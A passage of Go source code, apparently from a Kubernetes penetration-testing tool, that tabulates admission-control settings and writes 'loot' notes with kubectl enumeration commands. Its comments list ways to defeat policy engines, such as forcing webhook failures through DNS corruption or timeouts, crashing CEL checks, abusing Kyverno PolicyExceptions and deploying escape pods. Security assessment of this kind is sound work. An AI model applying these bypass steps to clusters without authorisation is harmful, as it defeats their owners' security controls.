					bypassReasons = append(bypassReasons, fmt.Sprintf("%s (failurePolicy:Ignore)", wh.Name))
				}
			}
			for _, wh := range finding.ValidatingWebhooks {
				if wh.FailurePolicy == "Ignore" {
					bypassReasons = append(bypassReasons, fmt.Sprintf("%s (failurePolicy:Ignore)", wh.Name))
				}
			}
			if len(bypassReasons) > 0 {
				webhookBypass = strings.Join(bypassReasons, ", ")
			} else {
				webhookBypass = "Yes"
			}
		}

		// Policy Engines - consolidated column
		var policyEngines []string
		if finding.VAPCount > 0 {
			policyEngines = append(policyEngines, fmt.Sprintf("VAP (%d)", finding.VAPCount))
		}
		if finding.GatekeeperCount > 0 {
			policyEngines = append(policyEngines, fmt.Sprintf("Gatekeeper (%d)", finding.GatekeeperCount))
		}
		if finding.KyvernoCount > 0 {
			policyEngines = append(policyEngines, fmt.Sprintf("Kyverno (%d)", finding.KyvernoCount))
		}
		if finding.KubewardenCount > 0 {
			policyEngines = append(policyEngines, fmt.Sprintf("Kubewarden (%d)", finding.KubewardenCount))
		}
		if finding.JsPolicyCount > 0 {
			policyEngines = append(policyEngines, fmt.Sprintf("jsPolicy (%d)", finding.JsPolicyCount))
		}
		if finding.PolarisEnabled {
			policyEngines = append(policyEngines, "Polaris")
		}
		if finding.DatreeEnabled {
			policyEngines = append(policyEngines, "Datree")
		}
		policyEnginesStr := "<NONE>"
		if len(policyEngines) > 0 {
			policyEnginesStr = strings.Join(policyEngines, ", ")
		}

		// Policy Exceptions - bypass vectors
		var policyExceptions []string
		if len(finding.GatekeeperExcludedNamespaces) > 0 {
			// Check if current namespace is in the excluded list
			for _, excludedNs := range finding.GatekeeperExcludedNamespaces {
				if excludedNs == finding.Namespace {
					policyExceptions = append(policyExceptions, "Gatekeeper (ns excluded)")
					break
				}
			}
		}
		if finding.KyvernoExceptions > 0 {
			policyExceptions = append(policyExceptions, fmt.Sprintf("Kyverno (%d)", finding.KyvernoExceptions))
		}
		policyExceptionsStr := "<NONE>"
		if len(policyExceptions) > 0 {
			policyExceptionsStr = strings.Join(policyExceptions, ", ")
		}

		outputRows = append(outputRows, []string{
			finding.Namespace,
			pssEnforce,
			pssWarn,
			pssAudit,
			pspEnabled,
			privilegedAllowed,
			hostPathAllowed,
			hostNetworkAllowed,
			hostPIDAllowed,
			dangerousCaps,
			fmt.Sprintf("%d", finding.WebhookCount),
			webhookBypass,
			policyEnginesStr,
			policyExceptionsStr,
			finding.Age,
		})

		// Generate loot content
		generatePolicyLoot(&finding, loot)
	}

	// Generate webhook detail rows
	for _, wh := range mutatingWebhooks {
		timeoutStr := "<NONE>"
		if wh.TimeoutSeconds > 0 {
			timeoutStr = fmt.Sprintf("%ds", wh.TimeoutSeconds)
		}
		nsSelector := "No"
		if wh.HasExclusions {
			nsSelector = "Yes"
		}
		sideEffects := wh.SideEffects
		if sideEffects == "" {
			sideEffects = "<NONE>"
		}
		bypassRisk := "<NONE>"
		if wh.FailurePolicy == "Ignore" {
			bypassRisk = "Yes"
		}

		webhookRows = append(webhookRows, []string{
			wh.Name,
			"Mutating",
			wh.FailurePolicy,
			timeoutStr,
			nsSelector,
			sideEffects,
			bypassRisk,
		})
	}

	for _, wh := range validatingWebhooks {
		timeoutStr := "<NONE>"
		if wh.TimeoutSeconds > 0 {
			timeoutStr = fmt.Sprintf("%ds", wh.TimeoutSeconds)
		}
		nsSelector := "No"
		if wh.HasExclusions {
			nsSelector = "Yes"
		}
		sideEffects := wh.SideEffects
		if sideEffects == "" {
			sideEffects = "<NONE>"
		}
		bypassRisk := "<NONE>"
		if wh.FailurePolicy == "Ignore" {
			bypassRisk = "Yes"
		}

		webhookRows = append(webhookRows, []string{
			wh.Name,
			"Validating",
			wh.FailurePolicy,
			timeoutStr,
			nsSelector,
			sideEffects,
			bypassRisk,
		})
	}

	// Generate PSP detail rows
	for _, psp := range pspAnalyses {
		hostPathStr := "<NONE>"
		if psp.AllowsHostPath {
			if len(psp.AllowedHostPaths) > 0 {
				hostPathStr = strings.Join(psp.AllowedHostPaths, ", ")
			} else {
				hostPathStr = "Yes (any path)"
			}
		}

		capsStr := "<NONE>"
		if len(psp.AllowedCapabilities) > 0 {
			capsStr = strings.Join(psp.AllowedCapabilities, ", ")
		}

		pspRows = append(pspRows, []string{
			psp.Name,
			shared.FormatBool(psp.AllowsPrivileged),
			shared.FormatBool(psp.AllowsHostNetwork),
			shared.FormatBool(psp.AllowsHostPID),
			shared.FormatBool(psp.AllowsHostIPC),
			hostPathStr,
			capsStr,
			shared.FormatBool(psp.AllowsRunAsRoot),
		})
	}

	// Generate VAP detail rows
	for _, vap := range vapPolicies {
		bindingsStr := "<NONE>"
		if len(vap.Bindings) > 0 {
			bindingsStr = strings.Join(vap.Bindings, ", ")
		}

		failurePolicy := vap.FailurePolicy
		if failurePolicy == "" {
			failurePolicy = "Fail"
		}

		paramKind := vap.ParamKind
		if paramKind == "" {
			paramKind = "<NONE>"
		}

		vapRows = append(vapRows, []string{
			vap.Name,
			failurePolicy,
			fmt.Sprintf("%d", vap.Validations),
			paramKind,
			bindingsStr,
		})
	}

	// Generate Gatekeeper detail rows
	for _, constraint := range gatekeeperConstraints {
		matchStr := constraint.Match
		if matchStr == "" {
			matchStr = "<NONE>"
		}

		gatekeeperRows = append(gatekeeperRows, []string{
			constraint.Name,
			constraint.Kind,
			constraint.EnforcementAction,
			matchStr,
			fmt.Sprintf("%d", constraint.Violations),
		})
	}

	// Generate Kyverno policy detail rows
	for _, policy := range kyvernoPolicies {
		scope := "Cluster"
		ns := "<NONE>"
		if !policy.IsClusterPolicy {
			scope = "Namespace"
			ns = policy.Namespace
		}

		failureAction := policy.ValidationFailure
		if failureAction == "" {
			failureAction = "Audit"
		}

		kyvernoRows = append(kyvernoRows, []string{
			policy.Name,
			scope,
			ns,
			failureAction,
			fmt.Sprintf("%d", policy.Rules),
			shared.FormatBool(policy.Background),
		})
	}

	// Generate Kyverno exception detail rows (bypass vectors!)
	for _, exception := range kyvernoExceptions {
		policiesStr := "<NONE>"
		if len(exception.Policies) > 0 {
			policiesStr = strings.Join(exception.Policies, ", ")
		}

		rulesStr := "<NONE>"
		if len(exception.Rules) > 0 {
			rulesStr = strings.Join(exception.Rules, ", ")
		}

		matchStr := exception.Match
		if matchStr == "" {
			matchStr = "<NONE>"
		}

		kyvernoExceptionRows = append(kyvernoExceptionRows, []string{
			exception.Name,
			exception.Namespace,
			policiesStr,
			rulesStr,
			matchStr,
		})
	}

	// Generate Kubewarden detail rows
	for _, policy := range kubewardenPolicies {
		scope := "Cluster"
		ns := "<NONE>"
		if !policy.IsClusterPolicy {
			scope = "Namespace"
			ns = policy.Namespace
		}

		module := policy.Module
		if module == "" {
			module = "<NONE>"
		}

		rulesStr := policy.Rules
		if rulesStr == "" {
			rulesStr = "<NONE>"
		}

		kubewardenRows = append(kubewardenRows, []string{
			policy.Name,
			scope,
			ns,
			module,
			policy.Mode,
			shared.FormatBool(policy.Mutating),
			rulesStr,
		})
	}

	// Generate jsPolicy detail rows
	for _, policy := range jsPolicies {
		scope := "Cluster"
		ns := "<NONE>"
		if !policy.IsClusterPolicy {
			scope = "Namespace"
			ns = policy.Namespace
		}

		opsStr := "<NONE>"
		if len(policy.Operations) > 0 {
			opsStr = strings.Join(policy.Operations, ", ")
		}

		resStr := "<NONE>"
		if len(policy.Resources) > 0 {
			resStr = strings.Join(policy.Resources, ", ")
		}

		violationPolicy := policy.ViolationPolicy
		if violationPolicy == "" {
			violationPolicy = "deny"
		}

		jsPolicyRows = append(jsPolicyRows, []string{
			policy.Name,
			scope,
			ns,
			policy.Type,
			opsStr,
			resStr,
			violationPolicy,
		})
	}

	// Generate Gatekeeper exclusion rows (bypass vectors!)
	for _, excludedNs := range gatekeeperConfig.ExcludedNamespaces {
		gatekeeperExclusionRows = append(gatekeeperExclusionRows, []string{
			excludedNs,
			"Config.spec.match.excludedNamespaces",
		})
	}

	// PSP-specific loot
	if len(pspAnalyses) > 0 {
		loot.Section("PSP").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("PSP").Add("# PSP ENUMERATION")
		loot.Section("PSP").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("PSP").Add("")
		loot.Section("PSP").Add("# List all PSPs:")
		loot.Section("PSP").Add("kubectl get psp")
		loot.Section("PSP").Add("")

		for _, psp := range pspAnalyses {
			loot.Section("PSP").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("PSP").Addf("# PSP: %s", psp.Name)
			loot.Section("PSP").Addf("# ─────────────────────────────────────────────────────────────")
			loot.Section("PSP").Addf("kubectl get psp %s -o yaml", psp.Name)
			loot.Section("PSP").Add("")
			loot.Section("PSP").Add("# Security Configuration:")
			loot.Section("PSP").Addf("#   Privileged: %t", psp.AllowsPrivileged)
			loot.Section("PSP").Addf("#   HostNetwork: %t", psp.AllowsHostNetwork)
			loot.Section("PSP").Addf("#   HostPID: %t", psp.AllowsHostPID)
			loot.Section("PSP").Addf("#   HostIPC: %t", psp.AllowsHostIPC)
			loot.Section("PSP").Addf("#   HostPath: %t", psp.AllowsHostPath)
			if len(psp.AllowedCapabilities) > 0 {
				loot.Section("PSP").Addf("#   Dangerous Capabilities: %s", strings.Join(psp.AllowedCapabilities, ", "))
			}
			loot.Section("PSP").Add("")

			// Check which service accounts can use this PSP
			loot.Section("PSP").Add("# Find service accounts that can use this PSP:")
			loot.Section("PSP").Addf("kubectl get clusterrolebinding -o json | jq '.items[] | select(.roleRef.name==\"%s\") | {name: .metadata.name, subjects: .subjects}'", psp.Name)
			loot.Section("PSP").Addf("kubectl get rolebinding --all-namespaces -o json | jq '.items[] | select(.roleRef.name==\"%s\") | {namespace: .metadata.namespace, name: .metadata.name, subjects: .subjects}'", psp.Name)
			loot.Section("PSP").Add("")

			// Exploitation commands if PSP allows dangerous configs
			if psp.AllowsPrivileged || psp.AllowsHostPath || len(psp.AllowedCapabilities) > 0 {
				loot.Section("PSP").Add("# EXPLOITATION:")
				if psp.AllowsPrivileged {
					loot.Section("PSP").Add("# This PSP allows privileged containers - deploy escape pod")
				}
				if psp.AllowsHostPath {
					loot.Section("PSP").Add("# This PSP allows hostPath - mount host filesystem")
				}
				if len(psp.AllowedCapabilities) > 0 {
					loot.Section("PSP").Addf("# This PSP allows dangerous capabilities: %s", strings.Join(psp.AllowedCapabilities, ", "))
				}
				loot.Section("PSP").Add("")
			}
		}
	}

	// Webhook-specific loot
	if len(mutatingWebhooks) > 0 || len(validatingWebhooks) > 0 {
		loot.Section("Webhooks").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Webhooks").Add("# WEBHOOK ENUMERATION")
		loot.Section("Webhooks").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Webhooks").Add("")
		loot.Section("Webhooks").Add("# List all admission webhooks:")
		loot.Section("Webhooks").Add("kubectl get mutatingwebhookconfigurations")
		loot.Section("Webhooks").Add("kubectl get validatingwebhookconfigurations")
		loot.Section("Webhooks").Add("")

		for _, wh := range mutatingWebhooks {
			loot.Section("Webhooks").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("Webhooks").Addf("# Mutating Webhook: %s", wh.Name)
			loot.Section("Webhooks").Addf("# ─────────────────────────────────────────────────────────────")
			loot.Section("Webhooks").Addf("kubectl get mutatingwebhookconfiguration %s -o yaml", wh.Name)
			loot.Section("Webhooks").Addf("# Failure Policy: %s", wh.FailurePolicy)
			if wh.FailurePolicy == "Ignore" {
				loot.Section("Webhooks").Add("#")
				loot.Section("Webhooks").Add("# [BYPASS] failurePolicy=Ignore - webhook failures won't block pods")
				loot.Section("Webhooks").Add("# Techniques to trigger webhook failure:")
				loot.Section("Webhooks").Add("#   1. Network partition - block webhook endpoint")
				loot.Section("Webhooks").Add("#   2. Timeout - slow response > timeoutSeconds")
				loot.Section("Webhooks").Add("#   3. DNS failure - corrupt webhook service DNS")
				loot.Section("Webhooks").Add("#   4. Certificate expiry - wait for TLS cert to expire")
			}
			if wh.HasExclusions {
				loot.Section("Webhooks").Add("#")
				loot.Section("Webhooks").Add("# [BYPASS] Namespace selector configured - some namespaces excluded")
				loot.Section("Webhooks").Add("# Check which namespaces are excluded:")
				loot.Section("Webhooks").Addf("kubectl get mutatingwebhookconfiguration %s -o jsonpath='{.webhooks[*].namespaceSelector}'", wh.Name)
			}
			loot.Section("Webhooks").Add("")
		}

		for _, wh := range validatingWebhooks {
			loot.Section("Webhooks").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("Webhooks").Addf("# Validating Webhook: %s", wh.Name)
			loot.Section("Webhooks").Addf("# ─────────────────────────────────────────────────────────────")
			loot.Section("Webhooks").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", wh.Name)
			loot.Section("Webhooks").Addf("# Failure Policy: %s", wh.FailurePolicy)
			if wh.FailurePolicy == "Ignore" {
				loot.Section("Webhooks").Add("#")
				loot.Section("Webhooks").Add("# [BYPASS] failurePolicy=Ignore - webhook failures won't block pods")
				loot.Section("Webhooks").Add("# Techniques to trigger webhook failure:")
				loot.Section("Webhooks").Add("#   1. Network partition - block webhook endpoint")
				loot.Section("Webhooks").Add("#   2. Timeout - slow response > timeoutSeconds")
				loot.Section("Webhooks").Add("#   3. DNS failure - corrupt webhook service DNS")
				loot.Section("Webhooks").Add("#   4. Certificate expiry - wait for TLS cert to expire")
			}
			if wh.HasExclusions {
				loot.Section("Webhooks").Add("#")
				loot.Section("Webhooks").Add("# [BYPASS] Namespace selector configured - some namespaces excluded")
				loot.Section("Webhooks").Add("# Check which namespaces are excluded:")
				loot.Section("Webhooks").Addf("kubectl get validatingwebhookconfiguration %s -o jsonpath='{.webhooks[*].namespaceSelector}'", wh.Name)
			}
			loot.Section("Webhooks").Add("")
		}
	}

	// VAP-specific loot
	if len(vapPolicies) > 0 {
		loot.Section("VAP").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("VAP").Add("# VALIDATING ADMISSION POLICY ENUMERATION")
		loot.Section("VAP").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("VAP").Add("")
		loot.Section("VAP").Add("# List all ValidatingAdmissionPolicies:")
		loot.Section("VAP").Add("kubectl get validatingadmissionpolicies")
		loot.Section("VAP").Add("")
		loot.Section("VAP").Add("# List all ValidatingAdmissionPolicyBindings:")
		loot.Section("VAP").Add("kubectl get validatingadmissionpolicybindings")
		loot.Section("VAP").Add("")

		for _, vap := range vapPolicies {
			loot.Section("VAP").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("VAP").Addf("# VAP: %s", vap.Name)
			loot.Section("VAP").Addf("# ─────────────────────────────────────────────────────────────")
			loot.Section("VAP").Addf("kubectl get validatingadmissionpolicy %s -o yaml", vap.Name)
			loot.Section("VAP").Addf("# Failure Policy: %s", vap.FailurePolicy)
			loot.Section("VAP").Addf("# Validations: %d", vap.Validations)
			if len(vap.Bindings) > 0 {
				loot.Section("VAP").Addf("# Bindings: %s", strings.Join(vap.Bindings, ", "))
				loot.Section("VAP").Add("")
				loot.Section("VAP").Add("# Check binding details:")
				for _, binding := range vap.Bindings {
					loot.Section("VAP").Addf("kubectl get validatingadmissionpolicybinding %s -o yaml", binding)
				}
			}
			if vap.FailurePolicy == "Ignore" {
				loot.Section("VAP").Add("#")
				loot.Section("VAP").Add("# [BYPASS] failurePolicy=Ignore - policy failures won't block")
				loot.Section("VAP").Add("# Techniques to trigger CEL evaluation failure:")
				loot.Section("VAP").Add("#   1. Send malformed data that causes CEL panic")
				loot.Section("VAP").Add("#   2. Exceed expression evaluation cost limits")
			}
			loot.Section("VAP").Add("")
		}
	}

	// Gatekeeper-specific loot
	if len(gatekeeperConstraints) > 0 {
		loot.Section("Gatekeeper").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Gatekeeper").Add("# OPA GATEKEEPER ENUMERATION")
		loot.Section("Gatekeeper").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Gatekeeper").Add("")
		loot.Section("Gatekeeper").Add("# List all ConstraintTemplates:")
		loot.Section("Gatekeeper").Add("kubectl get constrainttemplates")
		loot.Section("Gatekeeper").Add("")
		loot.Section("Gatekeeper").Add("# List all constraints across all templates:")
		loot.Section("Gatekeeper").Add("kubectl get constraints")
		loot.Section("Gatekeeper").Add("")
		loot.Section("Gatekeeper").Add("# Check Gatekeeper system status:")
		loot.Section("Gatekeeper").Add("kubectl get pods -n gatekeeper-system")
		loot.Section("Gatekeeper").Add("kubectl logs -l control-plane=controller-manager -n gatekeeper-system --tail=50")
		loot.Section("Gatekeeper").Add("")

		// Group constraints by kind
		constraintsByKind := make(map[string][]GatekeeperConstraintInfo)
		for _, c := range gatekeeperConstraints {
			constraintsByKind[c.Kind] = append(constraintsByKind[c.Kind], c)
		}

		for kind, constraints := range constraintsByKind {
			loot.Section("Gatekeeper").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("Gatekeeper").Addf("# Constraint Template Kind: %s", kind)
			loot.Section("Gatekeeper").Addf("# ─────────────────────────────────────────────────────────────")
			loot.Section("Gatekeeper").Addf("kubectl get %s", strings.ToLower(kind))
			loot.Section("Gatekeeper").Add("")

			for _, c := range constraints {
				loot.Section("Gatekeeper").Addf("# Constraint: %s", c.Name)
				loot.Section("Gatekeeper").Addf("kubectl get %s %s -o yaml", strings.ToLower(kind), c.Name)
				loot.Section("Gatekeeper").Addf("# Enforcement: %s", c.EnforcementAction)
				if c.Violations > 0 {
					loot.Section("Gatekeeper").Addf("# [!] %d existing violation(s)", c.Violations)
				}
				if c.EnforcementAction == "dryrun" || c.EnforcementAction == "warn" {
					loot.Section("Gatekeeper").Add("#")
					loot.Section("Gatekeeper").Addf("# [WEAK] Enforcement action '%s' - violations not blocked", c.EnforcementAction)
				}
				loot.Section("Gatekeeper").Add("")
			}
		}

		loot.Section("Gatekeeper").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Gatekeeper").Add("# GATEKEEPER BYPASS TECHNIQUES")
		loot.Section("Gatekeeper").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Gatekeeper").Add("#")
		loot.Section("Gatekeeper").Add("# 1. Webhook failure bypass (if failurePolicy=Ignore):")
		loot.Section("Gatekeeper").Add("kubectl get validatingwebhookconfiguration gatekeeper-validating-webhook-configuration -o yaml | grep failurePolicy")
		loot.Section("Gatekeeper").Add("#")
		loot.Section("Gatekeeper").Add("# 2. Namespace exclusion (check for exempt namespaces):")
		loot.Section("Gatekeeper").Add("kubectl get config.config.gatekeeper.sh config -o jsonpath='{.spec.match[*].excludedNamespaces}'")
		loot.Section("Gatekeeper").Add("#")
		loot.Section("Gatekeeper").Add("# 3. Check for dryrun/warn constraints:")
		loot.Section("Gatekeeper").Add("kubectl get constraints -o jsonpath='{range .items[*]}{.kind}/{.metadata.name}: {.spec.enforcementAction}{\"\\n\"}{end}'")
		loot.Section("Gatekeeper").Add("")
	}

	// Kyverno-specific loot
	if len(kyvernoPolicies) > 0 || len(kyvernoExceptions) > 0 {
		loot.Section("Kyverno").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Kyverno").Add("# KYVERNO ENUMERATION")
		loot.Section("Kyverno").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Kyverno").Add("")
		loot.Section("Kyverno").Add("# List all ClusterPolicies:")
		loot.Section("Kyverno").Add("kubectl get clusterpolicies")
		loot.Section("Kyverno").Add("")
		loot.Section("Kyverno").Add("# List all Policies (namespace-scoped):")
		loot.Section("Kyverno").Add("kubectl get policies --all-namespaces")
		loot.Section("Kyverno").Add("")
		loot.Section("Kyverno").Add("# List PolicyExceptions (BYPASS VECTORS!):")
		loot.Section("Kyverno").Add("kubectl get policyexceptions --all-namespaces")
		loot.Section("Kyverno").Add("")
		loot.Section("Kyverno").Add("# Check Kyverno system status:")
		loot.Section("Kyverno").Add("kubectl get pods -n kyverno")
		loot.Section("Kyverno").Add("")

		for _, policy := range kyvernoPolicies {
			scope := "ClusterPolicy"
			if !policy.IsClusterPolicy {
				scope = "Policy"
			}
			loot.Section("Kyverno").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("Kyverno").Addf("# %s: %s", scope, policy.Name)
			loot.Section("Kyverno").Addf("# ─────────────────────────────────────────────────────────────")
			if policy.IsClusterPolicy {
				loot.Section("Kyverno").Addf("kubectl get clusterpolicy %s -o yaml", policy.Name)
			} else {
				loot.Section("Kyverno").Addf("kubectl get policy %s -n %s -o yaml", policy.Name, policy.Namespace)
			}
			loot.Section("Kyverno").Addf("# Validation Failure Action: %s", policy.ValidationFailure)
			loot.Section("Kyverno").Addf("# Rules: %d", policy.Rules)
			if len(policy.RuleNames) > 0 {
				loot.Section("Kyverno").Addf("# Rule Names: %s", strings.Join(policy.RuleNames, ", "))
			}
			if policy.ValidationFailure == "Audit" || policy.ValidationFailure == "audit" {
				loot.Section("Kyverno").Add("#")
				loot.Section("Kyverno").Add("# [WEAK] Audit mode - violations logged but not blocked")
			}
			loot.Section("Kyverno").Add("")
		}

		// Policy Exceptions are critical bypass vectors
		if len(kyvernoExceptions) > 0 {
			loot.Section("Kyverno").Add("\n# ═══════════════════════════════════════════════════════════")
			loot.Section("Kyverno").Add("# [CRITICAL] POLICY EXCEPTIONS - BYPASS VECTORS!")
			loot.Section("Kyverno").Add("# ═══════════════════════════════════════════════════════════")
			loot.Section("Kyverno").Add("#")
			loot.Section("Kyverno").Add("# PolicyExceptions allow resources to BYPASS Kyverno policies")
			loot.Section("Kyverno").Add("# Check if you can create/modify PolicyExceptions to bypass controls")
			loot.Section("Kyverno").Add("")

			for _, exception := range kyvernoExceptions {
				loot.Section("Kyverno").Addf("\n# ─────────────────────────────────────────────────────────────")
				loot.Section("Kyverno").Addf("# PolicyException: %s (ns: %s)", exception.Name, exception.Namespace)
				loot.Section("Kyverno").Addf("# ─────────────────────────────────────────────────────────────")
				loot.Section("Kyverno").Addf("kubectl get policyexception %s -n %s -o yaml", exception.Name, exception.Namespace)
				if len(exception.Policies) > 0 {
					loot.Section("Kyverno").Addf("# Exempted Policies: %s", strings.Join(exception.Policies, ", "))
				}
				if len(exception.Rules) > 0 {
					loot.Section("Kyverno").Addf("# Exempted Rules: %s", strings.Join(exception.Rules, ", "))
				}
				loot.Section("Kyverno").Add("#")
				loot.Section("Kyverno").Add("# [ATTACK] Resources matching this exception can bypass the listed policies!")
				loot.Section("Kyverno").Add("")
			}
		}

		loot.Section("Kyverno").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Kyverno").Add("# KYVERNO BYPASS TECHNIQUES")
		loot.Section("Kyverno").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Kyverno").Add("#")
		loot.Section("Kyverno").Add("# 1. Check if you can create PolicyExceptions:")
		loot.Section("Kyverno").Add("kubectl auth can-i create policyexceptions --all-namespaces")
		loot.Section("Kyverno").Add("#")
		loot.Section("Kyverno").Add("# 2. Webhook failure bypass (if failurePolicy=Ignore):")
		loot.Section("Kyverno").Add("kubectl get validatingwebhookconfiguration kyverno-resource-validating-webhook-cfg -o yaml | grep failurePolicy")
		loot.Section("Kyverno").Add("#")
		loot.Section("Kyverno").Add("# 3. Check for Audit-only policies:")
		loot.Section("Kyverno").Add("kubectl get clusterpolicies -o jsonpath='{range .items[*]}{.metadata.name}: {.spec.validationFailureAction}{\"\\n\"}{end}'")
		loot.Section("Kyverno").Add("#")
		loot.Section("Kyverno").Add("# 4. Check namespace exclusions:")
		loot.Section("Kyverno").Add("kubectl get configmap kyverno -n kyverno -o yaml | grep -A 10 excludeGroups")
		loot.Section("Kyverno").Add("")
	}

	// Kubewarden-specific loot
	if len(kubewardenPolicies) > 0 {
		loot.Section("Kubewarden").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Kubewarden").Add("# KUBEWARDEN ENUMERATION")
		loot.Section("Kubewarden").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Kubewarden").Add("")
		loot.Section("Kubewarden").Add("# List all ClusterAdmissionPolicies:")
		loot.Section("Kubewarden").Add("kubectl get clusteradmissionpolicies")
		loot.Section("Kubewarden").Add("")
		loot.Section("Kubewarden").Add("# List all AdmissionPolicies (namespace-scoped):")
		loot.Section("Kubewarden").Add("kubectl get admissionpolicies --all-namespaces")
		loot.Section("Kubewarden").Add("")
		loot.Section("Kubewarden").Add("# Check Kubewarden system status:")
		loot.Section("Kubewarden").Add("kubectl get pods -n kubewarden")
		loot.Section("Kubewarden").Add("kubectl get policyservers")
		loot.Section("Kubewarden").Add("")

		for _, policy := range kubewardenPolicies {
			scope := "ClusterAdmissionPolicy"
			if !policy.IsClusterPolicy {
				scope = "AdmissionPolicy"
			}
			loot.Section("Kubewarden").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("Kubewarden").Addf("# %s: %s", scope, policy.Name)
			loot.Section("Kubewarden").Addf("# ─────────────────────────────────────────────────────────────")
			if policy.IsClusterPolicy {
				loot.Section("Kubewarden").Addf("kubectl get clusteradmissionpolicy %s -o yaml", policy.Name)
			} else {
				loot.Section("Kubewarden").Addf("kubectl get admissionpolicy %s -n %s -o yaml", policy.Name, policy.Namespace)
			}
			loot.Section("Kubewarden").Addf("# Module: %s", policy.Module)
			loot.Section("Kubewarden").Addf("# Mode: %s", policy.Mode)
			loot.Section("Kubewarden").Addf("# Mutating: %t", policy.Mutating)
			if policy.Mode == "monitor" {
				loot.Section("Kubewarden").Add("#")
				loot.Section("Kubewarden").Add("# [WEAK] Monitor mode - violations logged but not blocked")
			}
			loot.Section("Kubewarden").Add("")
		}

		loot.Section("Kubewarden").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Kubewarden").Add("# KUBEWARDEN BYPASS TECHNIQUES")
		loot.Section("Kubewarden").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Kubewarden").Add("#")
		loot.Section("Kubewarden").Add("# 1. Check for monitor-mode policies:")
		loot.Section("Kubewarden").Add("kubectl get clusteradmissionpolicies -o jsonpath='{range .items[*]}{.metadata.name}: {.spec.mode}{\"\\n\"}{end}'")
		loot.Section("Kubewarden").Add("#")
		loot.Section("Kubewarden").Add("# 2. Check PolicyServer status:")
		loot.Section("Kubewarden").Add("kubectl get policyservers -o yaml")
		loot.Section("Kubewarden").Add("#")
		loot.Section("Kubewarden").Add("# 3. Webhook failure bypass:")
		loot.Section("Kubewarden").Add("kubectl get validatingwebhookconfiguration -l kubewarden -o yaml | grep failurePolicy")
		loot.Section("Kubewarden").Add("")
	}

	// jsPolicy-specific loot
	if len(jsPolicies) > 0 {
		loot.Section("jsPolicy").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("jsPolicy").Add("# JSPOLICY ENUMERATION")
		loot.Section("jsPolicy").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("jsPolicy").Add("")
		loot.Section("jsPolicy").Add("# List all ClusterJsPolicies:")
		loot.Section("jsPolicy").Add("kubectl get clusterjspolicies")
		loot.Section("jsPolicy").Add("")
		loot.Section("jsPolicy").Add("# List all JsPolicies (namespace-scoped):")
		loot.Section("jsPolicy").Add("kubectl get jspolicies --all-namespaces")
		loot.Section("jsPolicy").Add("")
		loot.Section("jsPolicy").Add("# Check jsPolicy system status:")
		loot.Section("jsPolicy").Add("kubectl get pods -n jspolicy")
		loot.Section("jsPolicy").Add("")

		for _, policy := range jsPolicies {
			scope := "ClusterJsPolicy"
			if !policy.IsClusterPolicy {
				scope = "JsPolicy"
			}
			loot.Section("jsPolicy").Addf("\n# ─────────────────────────────────────────────────────────────")
			loot.Section("jsPolicy").Addf("# %s: %s", scope, policy.Name)
			loot.Section("jsPolicy").Addf("# ─────────────────────────────────────────────────────────────")
			if policy.IsClusterPolicy {
				loot.Section("jsPolicy").Addf("kubectl get clusterjspolicy %s -o yaml", policy.Name)
			} else {
				loot.Section("jsPolicy").Addf("kubectl get jspolicy %s -n %s -o yaml", policy.Name, policy.Namespace)
			}
			loot.Section("jsPolicy").Addf("# Type: %s", policy.Type)
			if len(policy.Operations) > 0 {
				loot.Section("jsPolicy").Addf("# Operations: %s", strings.Join(policy.Operations, ", "))
			}
			if len(policy.Resources) > 0 {
				loot.Section("jsPolicy").Addf("# Resources: %s", strings.Join(policy.Resources, ", "))
			}
			if policy.ViolationPolicy == "warn" {
				loot.Section("jsPolicy").Add("#")
				loot.Section("jsPolicy").Add("# [WEAK] Violation policy 'warn' - violations logged but not blocked")
			}
			loot.Section("jsPolicy").Add("")
		}

		loot.Section("jsPolicy").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("jsPolicy").Add("# JSPOLICY BYPASS TECHNIQUES")
		loot.Section("jsPolicy").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("jsPolicy").Add("#")
		loot.Section("jsPolicy").Add("# 1. Check for warn-only policies:")
		loot.Section("jsPolicy").Add("kubectl get clusterjspolicies -o jsonpath='{range .items[*]}{.metadata.name}: {.spec.violationPolicy}{\"\\n\"}{end}'")
		loot.Section("jsPolicy").Add("#")
		loot.Section("jsPolicy").Add("# 2. Webhook failure bypass:")
		loot.Section("jsPolicy").Add("kubectl get validatingwebhookconfiguration jspolicy-webhook -o yaml | grep failurePolicy")
		loot.Section("jsPolicy").Add("")
	}

	// Polaris-specific loot
	if polarisConfig.WebhookEnabled || polarisConfig.ConfigMap != "" {
		loot.Section("Polaris").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Polaris").Add("# POLARIS ENUMERATION")
		loot.Section("Polaris").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Polaris").Add("")
		loot.Section("Polaris").Add("# Check Polaris webhook:")
		loot.Section("Polaris").Add("kubectl get validatingwebhookconfiguration | grep -i polaris")
		loot.Section("Polaris").Add("")
